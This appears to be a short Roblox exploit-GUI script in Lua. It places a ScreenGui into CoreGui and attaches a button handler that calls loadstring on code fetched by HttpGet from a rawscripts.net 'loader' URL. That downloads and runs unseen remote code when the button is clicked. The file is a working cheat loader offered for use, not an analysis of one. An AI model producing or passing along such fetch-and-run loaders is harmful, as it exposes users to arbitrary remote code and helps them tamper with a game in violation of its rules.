-- Scripts:

local function NLYA_fake_script() -- A0nePiece.Script 
	local script = Instance.new('Script', A0nePiece)

	A0nePiece.ScreenGui.Parent = game.CoreGui
	
end
coroutine.wrap(NLYA_fake_script)()
local function AZLW_fake_script() -- _0101Uzu.Script 
	local script = Instance.new('Script', _0101Uzu)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()
	end)
end
coroutine.wrap(AZLW_fake_script)()
